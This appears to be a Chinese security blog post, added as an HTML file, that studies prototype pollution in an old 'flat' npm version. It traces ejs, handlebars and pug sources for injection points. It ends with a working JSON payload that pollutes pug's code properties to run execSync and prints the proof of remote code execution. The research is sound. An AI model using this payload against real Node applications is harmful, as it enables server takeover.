@@ -1,0 +1,557 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+
+
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/css/images/bg/favicon.ico">
+  <link rel="icon" type="image/png" href="/css/images/bg/favicon.ico">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="摸鱼">
+  <meta name="author" content="Aluvion">
+  <meta name="keywords" content="">
+  <title>原型链污染注入HTML模板 - Twings</title>
+
+  <link  rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/5.12.1/css/all.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/twitter-bootstrap/4.4.1/css/bootstrap.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/mdbootstrap/4.13.0/css/mdb.min.css" />
+<link  rel="stylesheet" href="https://cdn.staticfile.org/github-markdown-css/3.0.1/github-markdown.min.css" />
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1067060_qzomjdt8bmp.css">
+
+
+
+  <link  rel="stylesheet" href="/lib/prettify/tomorrow-night-eighties.min.css" />
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link defer rel="stylesheet" href="https://cdn.staticfile.org/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+<!-- 自定义样式保持在最底部 -->
+
+
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Twings</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/">首页</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/archives/">归档</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/tags/">标签</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/about/">关于</a>
+          </li>
+        
+          
+          
+          
+          
+          <li class="nav-item">
+            <a class="nav-link" href="/links/">友链</a>
+          </li>
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="view intro-2" id="background" parallax=true
+         style="background: url('/css/images/bg/bg5.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask rgba-black-light flex-center">
+          <div class="container text-center white-text fadeInUp">
+            <span class="h2" id="subtitle">
+              
+            </span>
+
+            
+              
+                <p class="mt-3 post-meta">
+                  <i class="fas fa-calendar-alt" aria-hidden="true"></i>
+                  星期二, 七月 4日 2023, 11:58 晚上
+                </p>
+              
+
+              <p class="mt-1">
+                
+                  
+                  <span class="post-meta">
+                    <i class="far fa-chart-bar"></i>
+                    2k 字
+                  </span>
+                
+
+                
+                  
+                  <span class="post-meta">
+                      <i class="far fa-clock"></i>
+                      9 分钟
+                  </span>
+                
+
+                
+                  <!-- 不蒜子统计文章PV -->
+                  
+                  <span id="busuanzi_container_page_pv" class="post-meta" style="display: none">
+                    <i class="far fa-eye" aria-hidden="true"></i>
+                    <span id="busuanzi_value_page_pv"></span> 次
+                  </span>
+                
+              </p>
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid">
+  <div class="row">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-md">
+      <div class="container nopadding-md" id="board-ctn">
+        <div class="py-5 z-depth-3" id="board">
+          <div class="post-content mx-auto" id="post">
+            
+            <div class="markdown-body">
+              <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>5555学习。</p>
+<span id="more"></span>
+
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>初始化一个web项目：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> unflatten = <span class="built_in">require</span>(<span class="string">&#x27;flat&#x27;</span>).<span class="property">unflatten</span></span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>()</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;Hello World!&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(req.<span class="property">body</span>, data, <span class="variable language_">this</span>.<span class="property">polluted</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;OK&quot;</span>)</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">8080</span>, <span class="function">() =&gt;</span> &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;App Running...&quot;</span>)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>未指定版本下载依赖，但是测试时发现unflatten没有发生原型链污染，怀疑是版本问题，调试发现合并对象时的关键过滤代码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Object</span>.<span class="title function_">keys</span>(target).<span class="title function_">forEach</span>(<span class="keyword">function</span> (<span class="params">key</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> split = key.<span class="title function_">split</span>(delimiter).<span class="title function_">map</span>(transformKey)</span><br><span class="line">    <span class="keyword">let</span> key1 = <span class="title function_">getkey</span>(split.<span class="title function_">shift</span>())</span><br><span class="line">    <span class="keyword">let</span> key2 = <span class="title function_">getkey</span>(split[<span class="number">0</span>])</span><br><span class="line">    <span class="keyword">let</span> recipient = result</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (key2 !== <span class="literal">undefined</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key1 === <span class="string">&#x27;__proto__&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        &#125;</span><br><span class="line">        ...</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>当输入了__proto__.xxx这样的嵌套键值时，会触发过滤导致结果为undefined。</p>
+<p>更换一下flat版本，根据<a href="https://www.npmjs.com/package/flat?activeTab=versions">官方仓库</a>，选择了0.2.0版本的flat，此时可以触发原型链污染漏洞。</p>
+<h3 id="原型链污染注入模板解析引擎"><a href="#原型链污染注入模板解析引擎" class="headerlink" title="原型链污染注入模板解析引擎"></a>原型链污染注入模板解析引擎</h3><h4 id="ejs"><a href="#ejs" class="headerlink" title="ejs"></a>ejs</h4><p>修改一下测试代码，把模板引擎加进来：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;h1&gt;Hello, &lt;%= name %&gt;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">    `</span>;</span><br><span class="line">    <span class="keyword">const</span> html = ejs.<span class="title function_">render</span>(template, data);</span><br><span class="line">    res.<span class="title function_">send</span>(html)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>调试一下render函数，读一下模板渲染部分的源码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">return</span> <span class="title function_">handleCache</span>(opts, template)(data);</span><br></pre></td></tr></table></figure>
+
+<p>很明显模板代码最后会被整合成一个匿名函数并执行，所以只要在里面注入字符串代码就能实现RCE。</p>
+<p>看到匿名函数主要由两个部分组成，第一部分是编译设置中的一些数据和预置的一些函数，如：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.<span class="property">_with</span> !== <span class="literal">false</span>) &#123;</span><br><span class="line">    prepended +=  <span class="string">&#x27;  with (&#x27;</span> + opts.<span class="property">localsName</span> + <span class="string">&#x27; || &#123;&#125;) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">    appended += <span class="string">&#x27;  &#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果this.source没有数据，这些代码最后会拼接到this.source中，第二部分就是用户模板：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (opts.<span class="property">compileDebug</span>) &#123;</span><br><span class="line">    src = <span class="string">&#x27;var __line = 1&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;  , __lines = &#x27;</span> + <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(<span class="variable language_">this</span>.<span class="property">templateText</span>) + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;  , __filename = &#x27;</span> + sanitizedFilename + <span class="string">&#x27;;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;try &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="variable language_">this</span>.<span class="property">source</span></span><br><span class="line">    + <span class="string">&#x27;&#125; catch (e) &#123;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;  rethrow(e, __lines, __filename, __line, escapeFn);&#x27;</span> + <span class="string">&#x27;\n&#x27;</span></span><br><span class="line">    + <span class="string">&#x27;&#125;&#x27;</span> + <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">    src = <span class="variable language_">this</span>.<span class="property">source</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>最后会整合成一个匿名函数返回：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fn = <span class="keyword">new</span> <span class="title function_">ctor</span>(opts.<span class="property">localsName</span> + <span class="string">&#x27;, escapeFn, include, rethrow&#x27;</span>, src);</span><br></pre></td></tr></table></figure>
+
+<p>根据调试，this中的属性似乎拼接不进去，而可以拼接进去的opts对象是由createNullProtoObjWherePossible函数创建的，看起来无法通过原型链进行污染。</p>
+<p>或许低版本没有做那么多防护，可以利用，不多研究了。</p>
+<h4 id="handlebars"><a href="#handlebars" class="headerlink" title="handlebars"></a>handlebars</h4><p>修改一下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> data = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line"><span class="keyword">const</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">    &lt;h1&gt;Hello, &#123;&#123;name&#125;&#125;!&lt;/h1&gt;</span></span><br><span class="line"><span class="string">`</span>;</span><br><span class="line"><span class="keyword">const</span> c = handlebars.<span class="title function_">compile</span>(template);</span><br><span class="line"><span class="keyword">const</span> html = <span class="title function_">c</span>(data)</span><br><span class="line">res.<span class="title function_">send</span>(html)</span><br></pre></td></tr></table></figure>
+
+<p>调试发现分为AST解析和执行两个部分，解析出来的AST主要由2个字符串常量和一个变量一共3个部分组成：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">[</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    type<span class="punctuation">:</span> <span class="string">&quot;ContentStatement&quot;</span><span class="punctuation">,</span></span><br><span class="line">    original<span class="punctuation">:</span> <span class="string">&quot;\n        &lt;h1&gt;Hello, &quot;</span><span class="punctuation">,</span></span><br><span class="line">    value<span class="punctuation">:</span> <span class="string">&quot;\n        &lt;h1&gt;Hello, &quot;</span><span class="punctuation">,</span></span><br><span class="line">    loc<span class="punctuation">:</span> <span class="punctuation">&#123;</span>...<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    type<span class="punctuation">:</span> <span class="string">&quot;MustacheStatement&quot;</span><span class="punctuation">,</span></span><br><span class="line">    path<span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">      type<span class="punctuation">:</span> <span class="string">&quot;PathExpression&quot;</span><span class="punctuation">,</span></span><br><span class="line">      data<span class="punctuation">:</span> <span class="literal"><span class="keyword">false</span></span><span class="punctuation">,</span></span><br><span class="line">      depth<span class="punctuation">:</span> <span class="number">0</span><span class="punctuation">,</span></span><br><span class="line">      parts<span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">      <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">      original<span class="punctuation">:</span> <span class="string">&quot;name&quot;</span><span class="punctuation">,</span></span><br><span class="line">      loc<span class="punctuation">:</span> <span class="punctuation">&#123;</span>...<span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="punctuation">&#123;</span></span><br><span class="line">    type<span class="punctuation">:</span> <span class="string">&quot;ContentStatement&quot;</span><span class="punctuation">,</span></span><br><span class="line">    original<span class="punctuation">:</span> <span class="string">&quot;!&lt;/h1&gt;\n    &quot;</span><span class="punctuation">,</span></span><br><span class="line">    value<span class="punctuation">:</span> <span class="string">&quot;!&lt;/h1&gt;\n    &quot;</span><span class="punctuation">,</span></span><br><span class="line">    ...</span><br><span class="line">  <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line"><span class="punctuation">]</span></span><br></pre></td></tr></table></figure>
+
+<p>然后分别根据type调用对应的字节码编写函数：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Program</span>: <span class="keyword">function</span> <span class="title function_">Program</span>(<span class="params">program</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">unshift</span>(program.<span class="property">blockParams</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> body = program.<span class="property">body</span>,</span><br><span class="line">        bodyLength = body.<span class="property">length</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; bodyLength; i++) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">accept</span>(body[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">options</span>.<span class="property">blockParams</span>.<span class="title function_">shift</span>();</span><br><span class="line"></span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">isSimple</span> = bodyLength === <span class="number">1</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">blockParams</span> = program.<span class="property">blockParams</span> ? program.<span class="property">blockParams</span>.<span class="property">length</span> : <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">this</span>;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<p>比如字符串常量就交给ContentStatement函数编写成一个appendContent字节码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">ContentStatement</span>: <span class="keyword">function</span> <span class="title function_">ContentStatement</span>(<span class="params">content</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (content.<span class="property">value</span>) &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;appendContent&#x27;</span>, content.<span class="property">value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<p>变量访问则交给了PathExpression函数整合成一个lookupOnContext字节码：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">PathExpression</span>: <span class="keyword">function</span> <span class="title function_">PathExpression</span>(<span class="params">path</span>) &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">addDepth</span>(path.<span class="property">depth</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;getContext&#x27;</span>, path.<span class="property">depth</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">var</span> name = path.<span class="property">parts</span>[<span class="number">0</span>],</span><br><span class="line">        scoped = _ast2[<span class="string">&#x27;default&#x27;</span>].<span class="property">helpers</span>.<span class="title function_">scopedId</span>(path),</span><br><span class="line">        blockParamId = !path.<span class="property">depth</span> &amp;&amp; !scoped &amp;&amp; <span class="variable language_">this</span>.<span class="title function_">blockParamIndex</span>(name);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (blockParamId) &#123;</span><br><span class="line">        ...</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable language_">this</span>.<span class="title function_">opcode</span>(<span class="string">&#x27;lookupOnContext&#x27;</span>, path.<span class="property">parts</span>, path.<span class="property">falsy</span>, path.<span class="property">strict</span>, scoped);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;,</span><br></pre></td></tr></table></figure>
+
+<p>没有发现哪里能注入额外的AST节点。</p>
+<h4 id="pug"><a href="#pug" class="headerlink" title="pug"></a>pug</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">post</span>(<span class="string">&quot;/&quot;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> data = <span class="title function_">unflatten</span>(req.<span class="property">body</span>);</span><br><span class="line">    <span class="keyword">const</span> template = <span class="string">`h1 Hello, #&#123;name&#125;!`</span>;</span><br><span class="line">    <span class="keyword">const</span> c = pug.<span class="title function_">compile</span>(template);</span><br><span class="line">    <span class="keyword">const</span> html = <span class="title function_">c</span>(data)</span><br><span class="line">    res.<span class="title function_">send</span>(html)</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>pug在将模板解析为AST后遍历该AST，整合成一个匿名函数执行，存在代码注入的可能：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> parsed = <span class="title function_">compileBody</span>(str, &#123;...&#125;);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> res = options.<span class="property">inlineRuntimeFunctions</span></span><br><span class="line">    ? <span class="keyword">new</span> <span class="title class_">Function</span>(<span class="string">&#x27;&#x27;</span>, parsed.<span class="property">body</span> + <span class="string">&#x27;;return template;&#x27;</span>)()</span><br><span class="line">    : <span class="title function_">runtimeWrap</span>(parsed.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>
+
+<p>调试发现，代码在遍历AST节点时存在注入：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (debug &amp;&amp; node.<span class="property">debug</span> !== <span class="literal">false</span> &amp;&amp; node.<span class="property">type</span> !== <span class="string">&#x27;Block&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (node.<span class="property">line</span>) &#123;</span><br><span class="line">        <span class="keyword">var</span> js = <span class="string">&#x27;;pug_debug_line = &#x27;</span> + node.<span class="property">line</span>;</span><br><span class="line">        <span class="keyword">if</span> (node.<span class="property">filename</span>)</span><br><span class="line">            js += <span class="string">&#x27;;pug_debug_filename = &#x27;</span> + <span class="title function_">stringify</span>(node.<span class="property">filename</span>);</span><br><span class="line">        <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">push</span>(js + <span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是经过了stringify函数过滤，无法闭合引号，将字符串变为代码，继续往下看。</p>
+<p>根据节点类型调用对应的处理函数，如用于处理h1标签的visitTag函数，当tag节点存在code属性时会进入visitCode函数，该code属性由原型链污染可控：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tag.<span class="property">code</span>) <span class="variable language_">this</span>.<span class="title function_">visitCode</span>(tag.<span class="property">code</span>);</span><br></pre></td></tr></table></figure>
+
+<p>看到这个函数中存在两个注入点，第一个是：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (code.<span class="property">block</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (!code.<span class="property">buffer</span>) <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">push</span>(<span class="string">&#x27;&#123;&#x27;</span>);</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">visit</span>(code.<span class="property">block</span>, code);</span><br><span class="line">    <span class="keyword">if</span> (!code.<span class="property">buffer</span>) <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">push</span>(<span class="string">&#x27;&#125;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>第二个是：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (code.<span class="property">buffer</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> val = code.<span class="property">val</span>.<span class="title function_">trim</span>();</span><br><span class="line">    val = <span class="string">&#x27;null == (pug_interp = &#x27;</span> + val + <span class="string">&#x27;) ? &quot;&quot; : pug_interp&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (code.<span class="property">mustEscape</span> !== <span class="literal">false</span>)</span><br><span class="line">        val = <span class="variable language_">this</span>.<span class="title function_">runtime</span>(<span class="string">&#x27;escape&#x27;</span>) + <span class="string">&#x27;(&#x27;</span> + val + <span class="string">&#x27;)&#x27;</span>;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="title function_">bufferExpression</span>(val);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="variable language_">this</span>.<span class="property">buf</span>.<span class="title function_">push</span>(code.<span class="property">val</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>都可以将代码插入匿名函数中，可以利用：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Twings&quot;</span><span class="punctuation">,</span> <span class="attr">&quot;__proto__.code&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;__proto__.__proto__.buffer&quot;</span><span class="punctuation">:</span> <span class="literal"><span class="keyword">true</span></span><span class="punctuation">,</span> <span class="attr">&quot;__proto__.__proto__.val&quot;</span><span class="punctuation">:</span> <span class="string">&quot;(process.mainModule.require(&#x27;child_process&#x27;).execSync(`whoami`))&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p>看到命令成功执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;laptop-mu9vjouc\twings</span><br><span class="line">Hello, Twings!&lt;/h1&gt;</span><br></pre></td></tr></table></figure>
+
